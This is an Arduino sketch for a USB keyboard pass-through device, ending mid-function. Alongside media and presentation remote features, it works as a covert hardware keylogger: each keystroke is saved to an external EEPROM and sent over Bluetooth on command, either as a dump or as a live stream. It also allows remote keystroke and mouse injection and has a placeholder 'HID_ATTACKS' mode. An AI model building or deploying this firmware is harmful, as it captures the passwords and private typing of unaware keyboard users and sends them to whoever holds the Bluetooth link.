#include <hidboot.h>
#include <usbhub.h>
#include <SoftwareSerial.h>

//new special HID library
#include "HID-Project.h"

// Satisfy the IDE, which needs to see the include statment in the ino too.
#ifdef dobogusinclude
#include <spi4teensy3.h>
#include <SPI.h>
#endif

//eeprom
#include <Wire.h>
#define disk1 0x50

//BLUETOOTH PIN'S
#define bluetoothTx 11
#define bluetoothRx 8

SoftwareSerial BT_1(bluetoothTx, bluetoothRx);

//BLUETOOTH EEPROM KEYWORD
#define BLUETOOTH_KEYWORD "&$^"

//BLUETOOTH RESET
#define bluetooth_resetPin 12

//ARDUINO RESET
#define arduino_resetPin 4

//DEBUG MONITOR
#define DEBUG 0
#define DEBUG_MOUSE 1
#define DEBUG_KEYBOARD 1
#define DEBUG_EEPROM 1
#define DEBUG_PRESS 1
#define DEBUG_BLUETOOTH 1
#define DEBUG_BLUETOOTH_RX 1
#define DEBUG_BLUETOOTH_RESET 1
#define DEBUG_VOLUME 1

//TEST
#define TEST_LED 1
#define TEST_BUTTON 1

//FUNCTIONS
#define FUNCTIONS 1
#define FUNCTION_HID_ATTACKS 1
#define FUNCTION_KEYBOARD 1
#define FUNCTION_MOUSE 1
#define FUNCTION_LIVE 1
#define FUNCTION_TIMER 1
#define FUNCTION_APP_BT_RESET 1
#define FUNCTION_DEVICE_RESET 1

//FUNCTIONS_MEDIA
#define FUNCTIONS_ALL_MEDIA 1
#define FUNCTION_MEDIA 1
#define FUNFTION_MULTIMEDIA 1
#define FUNCTION_VOLUME 1
#define FUNCTION_BROWSER 1
#define FUNCTION_POWERPOINT 1

//test button
#define test_buttonPin 5

//test led
#define test_ledPin 13

//BLUETOOTH
char input_byteData;
String printed;
boolean blueCommit = 0;
boolean blueKeyboard = 0;
boolean blueKeylogger = 0;
boolean blueKeyIn = 0; // eger normal tusa basilmissa 1 olur
boolean blueMouse = 0;

String debug_printed;

//MOUSE COORDINATE
int x;
int y;

boolean tut = 1; // if special or normal key pressed - > 0, otherwise - > 1
boolean special_tut = 0; // if special key did not press - > 0, otherwise - > 1

char keyes;
char lastButton;
char specialChar;

uint8_t keyesSpecial;
int pastKeyChecked = 0;
int specialKapa = 0;
boolean combinePress = 0;
int controlStop = 0;
int controlKey; // 0-ctrl 1-shift 2-alt 3-gui  // simdilik bir ise yaramiyor
int controlKeyChecked = 0; // iki kez calisan fonksiyon icin

//Combine key manage
int shiftControl = 0;
int ctrlControl = 0;
int altControl = 0;
int guiControl = 0;

//Key_Write_Normal
int eskiZaman = 0;
int yeniZaman;

//Key_Write_Special
int SPECIAL_eskiZaman = 0;
int SPECIAL_yeniZaman;

//BLUETOOTH_RESET_CONTROL
#define BLUETOOTH_RESET_TIME 300 // seconds
int new_seconds = 0;
int old_seconds;
int debug_second;

//TIMER_ALARM (50 DAYS)
unsigned long TIMER_eskiZaman = 0;
unsigned long TIMER_yeniZaman;

//OnControlKeysChanged
boolean right_ctrlEnabled;
boolean right_altEnabled;
boolean right_shiftEnabled;
boolean right_guiEnabled;
boolean left_ctrlEnabled;
boolean left_altEnabled;
boolean left_shiftEnabled;
boolean left_guiEnabled;

//EEPROM
byte adressEnd;
int _adressEnd;
int is_EEPROM_open; // 0 -> open // 1 -> close // it could be boolean
boolean eeprom_tut = 0;
boolean eeprom_read = 0;
int last_is_EEPROM_open; // it could be boolean
boolean eeprom_Sented = 0;
boolean read_ok = 0;
int for_eeprom = 1;
int k; // - > for eeprom debug

class KbdRptParser : public KeyboardReportParser
{
    void PrintKey(uint8_t mod, uint8_t key);
    void OnControlKeysChanged(uint8_t before, uint8_t after);
    void OnKeyDown	(uint8_t mod, uint8_t key);
    void OnKeyUp	(uint8_t mod, uint8_t key);
    void OnKeyboard(uint8_t key);
    void OnCtrl();
    void OnAlt();
    void OnShift();
    void OnGui();
    void OnSpecial(uint8_t key);
    void OnSpecialKey(uint8_t key);
    void OnKeyPressed(uint8_t key);

};

void KbdRptParser::PrintKey(uint8_t m, uint8_t key)
{
  MODIFIERKEYS mod;
  *((uint8_t*)&mod) = m;
  Serial.print((mod.bmLeftCtrl   == 1) ? "C" : " ");
  Serial.print((mod.bmLeftShift  == 1) ? "S" : " ");
  Serial.print((mod.bmLeftAlt    == 1) ? "A" : " ");
  Serial.print((mod.bmLeftGUI    == 1) ? "G" : " ");

  Serial.print(" >");
  PrintHex<uint8_t>(key, 0x80);
  Serial.print("< ");

  Serial.print((mod.bmRightCtrl   == 1) ? "C" : " ");
  Serial.print((mod.bmRightShift  == 1) ? "S" : " ");
  Serial.print((mod.bmRightAlt    == 1) ? "A" : " ");
  Serial.println((mod.bmRightGUI    == 1) ? "G" : " ");

};

void KbdRptParser::OnKeyDown(uint8_t mod, uint8_t key)
{
  tut = 0;
  eskiZaman = millis();
  OnSpecial(key); // ozel tus kontrolu ve yazdirilmasi
  Serial.print("DN ");
  PrintKey(mod, key);
  uint8_t c = OemToAscii(mod, key);
  keyes = (char)c; // seri yazdirirken kullanilan tus degiskeni

  if (c)
    OnKeyPressed(c);

  lastButton = keyes;

  eeprom_tut = 0;
}

void KbdRptParser::OnControlKeysChanged(uint8_t before, uint8_t after) { // bu fonksiyon iki kez calisiyor, ilk bastigimda ikincisi elimi cektigimde

  MODIFIERKEYS beforeMod;
  *((uint8_t*)&beforeMod) = before;

  MODIFIERKEYS afterMod;
  *((uint8_t*)&afterMod) = after;

  controlKeyChecked++;
  Serial.println(controlKeyChecked); // 1 basili tutuluyor 2 parmak cekildi


  if (beforeMod.bmLeftCtrl != afterMod.bmLeftCtrl) {
    Serial.println("LeftCtrl changed");
    OnCtrl();
    left_ctrlEnabled = 1;
    controlKey = 0;
    ctrlControl++; // tusa basilmissa 1 parmak cekilmisse 2 olur
  }
  if (beforeMod.bmLeftShift != afterMod.bmLeftShift) {
    Serial.println("LeftShift changed");
    OnShift();
    left_shiftEnabled = 1;
    controlKey = 1;
    shiftControl++;
    //controlKeyChecked = 0; // shift haliahzirda calistigi icin bu kod burada
  }
  if (beforeMod.bmLeftAlt != afterMod.bmLeftAlt) {
    Serial.println("LeftAlt changed");
    OnAlt();
    left_altEnabled = 1;
    controlKey = 2;
    altControl++;
  }
  if (beforeMod.bmLeftGUI != afterMod.bmLeftGUI) {
    Serial.println("LeftGUI changed");
    OnGui();
    left_guiEnabled = 1;
    controlKey = 3;
    guiControl++;
  }

  if (beforeMod.bmRightCtrl != afterMod.bmRightCtrl) {
    Serial.println("RightCtrl changed");
    OnCtrl();
    right_ctrlEnabled = 1;
    controlKey = 0;
    ctrlControl++;
  }
  if (beforeMod.bmRightShift != afterMod.bmRightShift) {
    Serial.println("RightShift changed");
    OnShift();
    right_shiftEnabled = 1;
    controlKey = 1;
    shiftControl++;
    //controlKeyChecked = 0; // shift haliahzirda calistigi icin bu kod burada
  }
  if (beforeMod.bmRightAlt != afterMod.bmRightAlt) {
    Serial.println("RightAlt changed");
    OnAlt();
    right_altEnabled = 1;
    controlKey = 2;
    altControl++;
  }
  if (beforeMod.bmRightGUI != afterMod.bmRightGUI) {
    Serial.println("RightGUI changed");
    OnGui();
    right_guiEnabled = 1;
    controlKey = 3;
    guiControl++;
  }
}

void KbdRptParser::OnKeyUp(uint8_t mod, uint8_t key)
{
  tut = 1;
  eeprom_tut = 1;
  Serial.print("UP ");
  PrintKey(mod, key);
  eskiZaman = yeniZaman; // tustan parmagimizi cektin time tutmayi durdur

  if (key == 40 || key == 41 || key == 42 || key == 43 || key == 58 || key == 59 || key == 60 || key == 61 || key == 62 || key == 63 || key == 64 || key == 65 || key == 66 || key == 67 || key == 68 || key == 69 || key == 73 || key == 74 || key == 75 || key == 76 || key == 77 || key == 78 || key == 79 || key == 80 || key == 81 || key == 82 || key == 88) {
    special_tut = 0; //ozel tus basimi durdu

    SPECIAL_eskiZaman = SPECIAL_yeniZaman;
    Keyboard.release(specialChar);
  }

  lastButton;
}

void KbdRptParser::OnKeyboard(uint8_t key)
{
  if (controlKeyChecked == 0) //eger ctrl-gui-alt-shift vs bir tusa basili tutuluyorsa calistirma // cunku orjinal klavyelerde ctrl gibi tusa basili tutuluyorken normal tus press olmaz
  {
    Keyboard.print((char)key);
    //delay(20); // tusa basildiktan sonra bekle
  }
}

void KbdRptParser::OnCtrl() {

  if (left_ctrlEnabled == 1) {
    Keyboard.write(KEY_LEFT_CTRL);
  }
  else if (right_ctrlEnabled == 1) {
    Keyboard.write(KEY_RIGHT_CTRL);
  }
}

void KbdRptParser::OnAlt() {

  if (left_altEnabled == 1) {
    Keyboard.write(KEY_LEFT_ALT);
  }
  else if (right_altEnabled == 1) {
    Keyboard.write(KEY_RIGHT_ALT);
  }
}

void KbdRptParser::OnShift() {

  if (left_shiftEnabled == 1) {
    Keyboard.write(KEY_LEFT_SHIFT);
  }
  else if (right_shiftEnabled == 1) {
    Keyboard.write(KEY_RIGHT_SHIFT);
  }
}

void KbdRptParser::OnGui() {

  if (left_guiEnabled == 1) {
    Keyboard.write(KEY_LEFT_GUI);
  }
  else if (right_guiEnabled == 1) {
    Keyboard.write(KEY_RIGHT_GUI);
  }
}

// tanimlanan keyleri dizi sekline getirmeye calis ki OnSpecial fonksiyonu icine for dongusu sokup surekli yenilenen kodlari kucultup alan kazan

void KbdRptParser::OnSpecial(uint8_t key)
{

  if (key == 40 || key == 41 || key == 42 || key == 43 || key == 58 || key == 59 || key == 60 || key == 61 || key == 62 || key == 63 || key == 64 || key == 65 || key == 66 || key == 67 || key == 68 || key == 69 || key == 73 || key == 74 || key == 75 || key == 76 || key == 77 || key == 78 || key == 79 || key == 80 || key == 81 || key == 82 || key == 88)
  {
    keyesSpecial = key; // loop icinde kullanabilmek icin
    special_tut = 1; // ozel tusa basildi
    OnSpecialKey(key);

    SPECIAL_eskiZaman = millis();

    if (controlKeyChecked == 0 || (pastKeyChecked == 2 && controlKeyChecked == 1)) // ya kombinasyon yokken yada hem varken ve tus kombinasyonu daha oncesinden yapilmisken
      // buradaki controlKeyChecked == 1 ifadesi gereksiz olabilir cunku zaten pastKeyChecked ifadesi == 2 bunun olamsiyla oluyor
    {

      switch (key) // ozel tus kontrolu ve yazdirilmasi
      {
        case 40: Keyboard.write(KEY_RETURN); break;
        case 41: Keyboard.write(KEY_ESC); break;
        case 42: Keyboard.write(KEY_BACKSPACE); break;
        case 43: Keyboard.write(KEY_TAB); break;
        case 58: Keyboard.write(KEY_F1); break;
        case 59: Keyboard.write(KEY_F2); break;
        case 60: Keyboard.write(KEY_F3); break;
        case 61: Keyboard.write(KEY_F4); break;
        case 62: Keyboard.write(KEY_F5); break;
        case 63: Keyboard.write(KEY_F6); break;
        case 64: Keyboard.write(KEY_F7); break;
        case 65: Keyboard.write(KEY_F8); break;
        case 66: Keyboard.write(KEY_F9); break;
        case 67: Keyboard.write(KEY_F10); break;
        case 68: Keyboard.write(KEY_F11); break;
        case 69: Keyboard.write(KEY_F12); break;
        case 73: Keyboard.write(KEY_INSERT); break;
        case 74: Keyboard.write(KEY_HOME); break;
        case 75: Keyboard.write(KEY_PAGE_UP); break;
        case 76: Keyboard.write(KEY_DELETE); break;
        case 77: Keyboard.write(KEY_END); break;
        case 78: Keyboard.write(KEY_PAGE_DOWN); break;
        case 79: Keyboard.write(KEY_RIGHT_ARROW); break;
        case 80: Keyboard.write(KEY_LEFT_ARROW); break;
        case 81: Keyboard.write(KEY_DOWN_ARROW); break;
        case 82: Keyboard.write(KEY_UP_ARROW); break;
        case 88: Keyboard.write(KEY_RETURN); break;
      }
    }
  }
}

void KbdRptParser::OnSpecialKey(uint8_t key)
{
  switch (key)
  {
    case 40: specialChar = KEY_RETURN; break;
    case 41: specialChar = KEY_ESC; break;
    case 42: specialChar = KEY_BACKSPACE; break;
    case 43: specialChar = KEY_TAB; break;
    case 58: specialChar = KEY_F1; break;
    case 59: specialChar = KEY_F2; break;
    case 60: specialChar = KEY_F3; break;
    case 61: specialChar = KEY_F4; break;
    case 62: specialChar = KEY_F5; break;
    case 63: specialChar = KEY_F6; break;
    case 64: specialChar = KEY_F7; break;
    case 65: specialChar = KEY_F8; break;
    case 66: specialChar = KEY_F9; break;
    case 67: specialChar = KEY_F10; break;
    case 68: specialChar = KEY_F11; break;
    case 69: specialChar = KEY_F12; break;
    case 73: specialChar = KEY_INSERT; break;
    case 74: specialChar = KEY_HOME; break;
    case 75: specialChar = KEY_PAGE_UP; break;
    case 76: specialChar = KEY_DELETE; break;
    case 77: specialChar = KEY_END; break;
    case 78: specialChar = KEY_PAGE_DOWN; break;
    case 79: specialChar = KEY_RIGHT_ARROW; break;
    case 80: specialChar = KEY_LEFT_ARROW; break;
    case 81: specialChar = KEY_DOWN_ARROW; break;
    case 82: specialChar = KEY_UP_ARROW; break;
    case 88: specialChar = KEY_RETURN; break;
  }
}

void KbdRptParser::OnKeyPressed(uint8_t key)
{
  Serial.print("ASCII: ");
  Serial.println((char)key);
  OnKeyboard((char)key);
  blueKeyIn = 1;
};

USB     Usb;
//USBHub     Hub(&Usb);
HIDBoot<USB_HID_PROTOCOL_KEYBOARD>    HidKeyboard(&Usb);

uint32_t next_time;

KbdRptParser Prs;

void setup()
{

  Serial.begin(115200);
  BT_1.begin(9600);

  //arduino_resetPin
  //pinMode(arduino_resetPin, INPUT);
  //digitalWrite(arduino_resetPin, HIGH);

  //bluetooth_resetPin
  pinMode(bluetooth_resetPin, OUTPUT);
  digitalWrite(bluetooth_resetPin, HIGH);

  if(TEST_BUTTON)
  {
    //test_buttonPin
    pinMode(test_buttonPin, INPUT);
    digitalWrite(test_buttonPin, HIGH);
  }

  if(TEST_LED)
  {
    //test_ledPin
    pinMode(test_ledPin, OUTPUT);
    digitalWrite(test_ledPin, LOW);
  }
  
  if(FUNCTIONS) { if(FUNCTION_MOUSE) { Mouse.begin(); } if(FUNCTIONS_ALL_MEDIA) { Consumer.begin(); } }
  
  Keyboard.begin();
  Wire.begin();
  
  unsigned int address = 0;

  is_EEPROM_open = (int)readEEPROM(disk1, 0);

  pinMode(4, INPUT_PULLUP);

  if(DEBUG) { Serial.println("Start"); }

  if (Usb.Init() == -1) { if(DEBUG) { Serial.println("OSC did znot start."); } }
  
  delay( 200 );
  next_time = millis() + 5000;
  HidKeyboard.SetReportParser(0, &Prs);
}

void loop() {

  Usb.Task();

  if (tut == 0) {
    yeniZaman = millis();  // tusa basilirsa zamani kaydet
  }

  if (special_tut == 1) {
    SPECIAL_yeniZaman = millis();  // ozel tusa basilirsa zamani kaydet
  }

  if(DEBUG) { if(DEBUG_BLUETOOTH_RESET) { debug_second = new_seconds; } }
    
  new_seconds = (millis()/1000);

  if(DEBUG) { if(DEBUG_BLUETOOTH_RESET) { if(debug_second < new_seconds) { Serial.println(new_seconds); } } }

  if(digitalRead(test_buttonPin) == LOW) // FOR HID TEST, IT WORKS WITH GND
  {
    //codes are here..
    digitalWrite(test_ledPin, HIGH);
  }
  else
  {
    digitalWrite(test_ledPin, LOW);
  }

  Bluetooth_Recive();
  Bluetooth_Printed();
  EEPROM_Transmit();
  EEPROM_Key_Saver();
  Live_Key_Transmit();
  Key_Write_Normal();
  Key_Write_Special();
  Key_Write_Combine();
  Combine_Key_Up();
  Combine_Unavaible();
  BLUETOOTH_RESET();  

}

void Bluetooth_Recive() {

  if (BT_1.available() > 0) {
    input_byteData = BT_1.read(); //recieve value from bluetooth
    printed += input_byteData;

    old_seconds = new_seconds;

    if(DEBUG) { if(DEBUG_BLUETOOTH_RESET) { Serial.println("BLUETOOTH_SECONDS_STARTS"); } }
    
    if (input_byteData == '#') { printed = ""; debug_printed  = ""; }
                 
    if (printed == "$") {

      blueKeyboard = 0;
      blueMouse = 0;
      blueKeylogger = 0; //live
      blueKeyIn = 0; //liveClose
      is_EEPROM_open = (int)readEEPROM(disk1, 0);
      read_ok = 0;
      printed = "";
      debug_printed  = "";
      
      }

    if(printed == "^") {
      
      blueKeyboard = 0;
      printed = "";
      debug_printed  = "";
    }

    if(DEBUG)
    {
      if(DEBUG_BLUETOOTH_RX)
      {
       if(input_byteData != '@')
        {
          debug_printed += input_byteData;
        }
        else
        {
          Serial.println("");
          Serial.println("RECIVED - > ");
          Serial.print(debug_printed);
          debug_printed;
        }   
      }
    }
 
    blueCommit = 1;

    if (input_byteData != '#' && blueKeyboard == 1) { Bluetooth_Key_Write(); } // BLUETOOTH KEYBOARD

    if (input_byteData != '#' && blueMouse == 1) { Bluetooth_Mouse_Write(); } // BLUETOOTH MOUSE

    if (digitalRead(4) == 0) { delay(1000); Serial.println(printed); }
  }
}


void Bluetooth_Printed() 
{

  if (blueCommit == 1) 
  {
    if(FUNCTIONS)
    {
      if(FUNCTION_KEYBOARD)
      {
        //KEYBOARD
        if (printed == "KEYBOARD_OPEN") { blueKeyboard = 1; }
        if (printed == "BACKSPACE") { Keyboard.press(KEY_BACKSPACE); Keyboard.releaseAll(); blueKeyboard = 1; }
      }

      if(FUNCTION_MOUSE)
      {
        //MOUSE
        if (printed == "MOUSE_OPEN") { blueMouse = 1; }
        if (printed == "PRESS") { Mouse.press(); Mouse.release(); }
        if (printed == "MIDDLE") { Mouse.click(MOUSE_MIDDLE); Mouse.release(); }
        if (printed == "RIGHT") { Mouse.click(MOUSE_RIGHT); Mouse.release(); }
        if (printed == "LONG_PRESS") { Mouse.press(); }
        if (printed == "LONG_MIDDLE") { Mouse.click(MOUSE_MIDDLE); }
        if (printed == "LONG_RIGHT") { Mouse.click(MOUSE_RIGHT); }
        if (printed == "LONG_END") { Mouse.release(); }
      }

      if(FUNCTION_LIVE)
      {
        //LIVE KEYLOGGER
        if (printed == "LIVE_KEYLOGGER_OPEN") { blueKeyIn = 0; blueKeylogger = 1; }
        if (printed == "LIVE_OPEN_CLOSE_EEPROM") { is_EEPROM_open = 0; blueKeyIn = 0; blueKeylogger = 1; }
      }

      if(FUNCTION_HID_ATTACKS)
      {
        //HID ATTACKS
        if (printed == "HID_ATTACKS_OPEN") {}
      }

      if(FUNCTION_APP_BT_RESET)
      {
        //BT-REST WITH APP
        if (printed == "BT_RESET") { new_seconds = old_seconds + 1; BLUETOOTH_RESET(); if(DEBUG) { if(DEBUG_BLUETOOTH_RESET) { Serial.println("BLUETOOTH_RESET"); } } }
        if (printed == "BT_TIMER_CHANGE") {}
      }

      if(FUNCTION_DEVICE_RESET)
      {
        //DEVICE RESET WITH APP
        if (printed == "DEVICE_RESET") {}
      }

      if(FUNCTION_TIMER)
      {
        //TIMER
        if (printed == "TIMER_CHECK") { if(BT_1.isListening()){ BT_1.print(""); } }
      }

      if(FUNCTIONS_ALL_MEDIA)
      {
        if(FUNCTION_POWERPOINT)
        {
          //POWERPOINT
          if (printed == "LEFT_ARROW") { Keyboard.press(KEY_LEFT_ARROW); Keyboard.releaseAll(); } 
          if (printed == "RIGHT_ARROW") { Keyboard.press(KEY_RIGHT_ARROW); Keyboard.releaseAll(); }
        }

        if(FUNCTION_MEDIA)
        {
          //MEDIA CONTROL
          if (printed == "PLAY_PAUSE") { Consumer.press(MEDIA_PLAY_PAUSE); Consumer_End(); }
          if (printed == "STOP") { Consumer.press(MEDIA_STOP); Consumer_End(); }
          if (printed == "NEXT") { Consumer.press(MEDIA_NEXT); Consumer_End(); }
          if (printed == "PREVIOUS") { Consumer.press(MEDIA_PREVIOUS); Consumer_End(); }
          if (printed == "REWIND") { Consumer.press(MEDIA_REWIND); Consumer_End(); }
          if (printed == "FAST_FORWARD") { Consumer.press(MEDIA_FAST_FORWARD); Consumer_End(); }
        }

        if(FUNCTION_VOLUME)
        {
          //VOLUME
          if (printed == "VOLUME_MUTE") { Consumer.press(MEDIA_VOLUME_MUTE); Consumer_End(); }
          if (printed == "VOLUME_UP") { Consumer.press(MEDIA_VOLUME_UP); Consumer_End(); }
          if (printed == "VOLUME_DOWN") { Consumer.press(MEDIA_VOLUME_DOWN); Consumer_End(); }
          if (printed == "VOLUME_HIGH") { volume_high(); }
          if (printed == "VOLUME_OFF") { volume_off(); }
        }

        if(FUNCTION_BROWSER)
        {
          //BROWSER
          if (printed == "BROWSER_HOME") { Consumer.press(CONSUMER_BROWSER_HOME); Consumer_End(); }
          if (printed == "BROWSER_BACK") { Consumer.press(CONSUMER_BROWSER_BACK); Consumer_End(); }
          if (printed == "BROWSER_FORWARD") {Consumer.press(CONSUMER_BROWSER_FORWARD); Consumer_End(); }
          if (printed == "BROWSER_REFRESH") {Consumer.press(CONSUMER_BROWSER_REFRESH); Consumer_End(); }
          if (printed == "BROWSER_BOOKMARKS") {Consumer.press(CONSUMER_BROWSER_BOOKMARKS); Consumer_End(); }
        }

        if(FUNFTION_MULTIMEDIA)
        {
          //EXTRA MULTIMEDIA KEY'S
          if (printed == "EMAIL_READER") { Consumer.press(CONSUMER_EMAIL_READER); Consumer_End(); }
          if (printed == "CALCULATOR") { Consumer.press(CONSUMER_CALCULATOR); Consumer_End(); }
          if (printed == "EXPLORER") { Consumer.press(CONSUMER_EXPLORER); Consumer_End(); }
        }
      }
    }

    //EEPROM CHECK
    if (printed == "EEPROM_CHECK") { if(readEEPROM(disk1, 0) == 0) { BT_1.print("EEPROM_IS_CLOSE"); is_EEPROM_open = 0;} else if(readEEPROM(disk1, 0) == 1) { BT_1.print("EEPROM_IS_OPEN"); is_EEPROM_open = 1; }}                     
    if (printed == "EEPROM_DATA_CHECK") { adressEnd = readEEPROM(disk1, 1); _adressEnd = (int) ((65536 - adressEnd - 2) * 100)/65536; BT_1.print(_adressEnd); }

    //EEPROM ON-OFF
    if (printed == "EEPROM_START") { writeEEPROM(disk1, 0, 1); is_EEPROM_open = 1; }
    if (printed == "EEPROM_STOP") { writeEEPROM(disk1, 0, 0); is_EEPROM_open = 0; }

    //FOR EEPROM
    if (printed == "IS_READABLE") { 
    
      if(readEEPROM(disk1, 1) >= 3 && read_ok == 0) { if(BT_1.isListening()) { BT_1.print("READ_ENABLE"); read_ok = 1; if(DEBUG) { Serial.println(""); Serial.println("SENTED  - > READ_ENABLE"); } } }
      else if (readEEPROM(disk1, 1) < 3) { eeprom_read = 0; if(BT_1.isListening()) { BT_1.print("READ_NOT_ENABLE"); read_ok = 1; if(DEBUG) { Serial.println(""); Serial.println("SENTED  - > READ_NOT_ENABLE"); } } } }
    
    if (printed == "EEPROM_GET_DATA") { eeprom_read = 1; is_EEPROM_open = is_EEPROM_open; is_EEPROM_open = 0; } 
    if (printed == "EEPROM_DATA_SAVED") { is_EEPROM_open = last_is_EEPROM_open; last_is_EEPROM_open; eeprom_read = 0; eeprom_Sented = 0; keyes; writeEEPROM(disk1, 1, (byte)for_eeprom); BT_1.print("EEPROM_FINISHED"); }
     
    blueCommit = 0;
  }
}

void debug()
{
  if(DEBUG)
  {
    Serial.println("");

    if(DEBUG_EEPROM)
    {
      if(is_EEPROM_open == 1 && eeprom_tut == 0)
      {
        Serial.println("EEPROM_Key_Saver  : 1");
        Serial.println("eeprom_tut        : 0");
        Serial.print("keyes               : ");
        Serial.print(keyes);
        Serial.println("adress 1        : ");
        Serial.print((int)readEEPROM(disk1, 1));
      }
      else if(eeprom_read == 1 && eeprom_Sented == 0)
      {
        Serial.println("EEPROM_Transmit  : 1");
        Serial.println("sented char      : ");
        Serial.print(char(readEEPROM(disk1, k)));
      }
    }
    if(DEBUG_MOUSE)
    {
      if(blueMouse == 1)
      {
        Serial.print("MOUSE_COORDINATE -  X & Y - > ");
        Serial.print(x);
        Serial.print(" & ");
        Serial.print(y);
      }
    } 
  }
}

void BLUETOOTH_RESET()
{
  if(new_seconds - old_seconds > BLUETOOTH_RESET_TIME)
  {
    digitalWrite(bluetooth_resetPin, LOW);
    delay(20);
    digitalWrite(bluetooth_resetPin, HIGH);
    old_seconds = new_seconds;

    if(DEBUG) { if(DEBUG_BLUETOOTH_RESET) { Serial.println("_BLUETOOTH_RESET"); } } 
  }
}

void Consumer_End()
{
  if(FUNCTIONS_ALL_MEDIA)
  {
    Consumer.releaseAll(); 
  }
}

void volume_high()
{
  if(FUNCTION_VOLUME)
  {
    for(int i = 0; i<100; i++)
    { 
      Consumer.press(MEDIA_VOLUME_UP); 
      delay(3); 
    } 
    Consumer_End();
  }
}

void volume_off()
{
  if(FUNCTION_VOLUME)
  {
    for(int i = 0; i<100; i++)
    { 
      Consumer.press(MEDIA_VOLUME_DOWN); 
      delay(3); 
    } 
    Consumer_End();
  }
}

void EEPROM_Transmit()
{
  if(eeprom_read == 1)
  {
    if(eeprom_Sented == 0)
    {
      for(int i = 2; i <= readEEPROM(disk1, 1); i++)
      {
        if(BT_1.isListening())
        {
          BT_1.print(char(readEEPROM(disk1, i)));
          delay(3);
          k = i;
          debug();
        }
      }
      eeprom_Sented = 1;
    }
    BT_1.print(BLUETOOTH_KEYWORD);
    delay(100);
  }
}

void EEPROM_Key_Saver()
{
  if(is_EEPROM_open == 1 && eeprom_tut == 0)
  {
    writeEEPROM(disk1, ((int)readEEPROM(disk1, 1)) + 1, byte(keyes));
    writeEEPROM(disk1, 1, readEEPROM(disk1, 1) + byte(1));
    eeprom_tut = 1;
    debug();
    keyes;
  }
}

void Live_Key_Transmit() 
{
  if(FUNCTION_LIVE)
  {
    if (blueKeylogger == 1 && blueKeyIn == 1) 
    {
      BT_1.print(lastButton);
      blueKeyIn = 0;
    }
  }
}

void Bluetooth_Key_Write() 
{
  if(FUNCTION_KEYBOARD)
  {
    if (blueCommit == 1) 
    {
      Keyboard.print(input_byteData); //print char as recieved byte by byte
      blueCommit = 0;
    }
  }
}

void Bluetooth_Mouse_Write() 
{
  if(FUNCTION_MOUSE)
  {
    if(input_byteData == '!')
    {
      printed = "";
    }
    if(input_byteData == '/')
    {
      x = printed.toInt();
      Mouse.move(-(x), 0, 0);
      printed = "";
    }
    if(input_byteData == '*')
    {
      y = printed.toInt();
      Mouse.move(0, -(y), 0);
      printed = "";
    }
    debug();
  }
}

void Key_Write_Normal() // normal tuslarin seri yazdirilmasi, controlKeyChecked == 0 yani kombinasyon tusuna basiliyorsa donguyu calistirma
{

  if (yeniZaman - eskiZaman > 1300 && tut == 0 && controlKeyChecked == 0) { 
    Keyboard.print(keyes);
    delay(35);
  }
}

void Key_Write_Special() // special_tut == 1 yani ozel tusa basilmis f1,f2,f3,tab,enter,home gibi, ozel tus bu sekilde seri yazdirilir
{                      // controlKeyChecked == 0 yani kombinasyon tusuna basiliyorsa donguyu calistirma

  if (SPECIAL_yeniZaman - SPECIAL_eskiZaman > 1300 && tut == 0 && special_tut == 1 && controlKeyChecked == 0) { 
    Keyboard.press(specialChar);                                                                                
  }
}

void Key_Write_Combine() 
{

  if (ctrlControl == 1 && (special_tut == 1 || tut == 0)) {
    if (left_ctrlEnabled == 1) {
      Keyboard.press(KEY_LEFT_CTRL);
    }
    else if (right_ctrlEnabled == 1) {
      Keyboard.press(KEY_RIGHT_CTRL);
    }
  }

  if (altControl == 1 && (special_tut == 1 || tut == 0)) {
    if (left_altEnabled == 1) {
      Keyboard.press(KEY_LEFT_ALT);
    }
    else if (right_altEnabled == 1) {
      Keyboard.press(KEY_RIGHT_ALT);
    }
  }

  if (shiftControl == 1 && (special_tut == 1 || tut == 0)) {
    if (left_shiftEnabled == 1) {
      Keyboard.press(KEY_LEFT_SHIFT);
    }
    else if (right_shiftEnabled == 1) {
      Keyboard.press(KEY_RIGHT_SHIFT);
    }
  }

  if (guiControl == 1 && (special_tut == 1 || tut == 0)) {
    if (left_guiEnabled == 1) {
      Keyboard.press(KEY_LEFT_GUI);
    }
    else if (right_guiEnabled == 1) {
      Keyboard.press(KEY_RIGHT_GUI);
    }
  }

}

void Combine_Key_Up() 
{

  if (controlKeyChecked == 2) { // ctrl - shift - alt - gui tuslarindan parmagimizi cektik

    controlKey = 4; // 0 ctrl 1 shift 2 alt 3 gui 4 null
    controlKeyChecked = 0; // OnControlKeysChanged fonksiyonunun tekrar donebilmesi icin gerekli
    pastKeyChecked = 0;
    specialKapa = 0;
  }

  if (ctrlControl == 2) { // ctrl tusundan parmagimizi cektik

    ctrlControl = 0; // tekrar icin gerekli
    left_ctrlEnabled = 0;
    right_ctrlEnabled = 0;
    Keyboard.release(KEY_LEFT_CTRL);
    Keyboard.release(KEY_RIGHT_CTRL);
  }

  if (altControl == 2) { // alt tusundan parmagimizi cektik

    altControl  = 0; // tekrar icin gerekli
    left_altEnabled = 0;
    right_altEnabled = 0;
    Keyboard.release(KEY_LEFT_ALT);
    Keyboard.release(KEY_RIGHT_ALT);
  }

  if (shiftControl == 2) { // shift tusundan parmagimizi cektik

    shiftControl = 0; // tekrar icin gerekli
    left_shiftEnabled = 0;
    right_shiftEnabled = 0;
    Keyboard.release(KEY_LEFT_SHIFT);
    Keyboard.release(KEY_RIGHT_SHIFT);
  }

  if (guiControl == 2) { // gui tusundan parmagimizi cektik

    guiControl = 0; // tekrar icin gerekli
    left_guiEnabled = 0;
    right_guiEnabled = 0;
    Keyboard.release(KEY_LEFT_GUI);
    Keyboard.release(KEY_RIGHT_GUI);
  }

  // kombinasyon icin bastigimiz normal tustan parmagimizi cektik
  if (((ctrlControl == 1 || altControl == 1 || shiftControl == 1 || guiControl == 1) && tut == 1) || ((ctrlControl == 0 || altControl == 0 || shiftControl == 0 || guiControl == 0) && tut == 1)) {

    Keyboard.release(lastButton);
  }

  // kombinasyon icin bastigimiz ozel tustan parmagimizi cektik
  if ((ctrlControl == 1 || altControl == 1 || shiftControl == 1 || guiControl == 1) && special_tut == 1  || ((ctrlControl == 0 || altControl == 0 || shiftControl == 0 || guiControl == 0) && special_tut == 1)) {

    Keyboard.release(specialChar);
  }

}

void Combine_Unavaible() 
{

  if ((ctrlControl == 1 || altControl == 1 || shiftControl == 1 || guiControl == 1) && tut == 0 && combinePress == 0)  { // burasi hatali, ilk basimda eski lastbutton geliyor

    Keyboard.press(lastButton);
    Serial.println(lastButton);
    combinePress = 1;
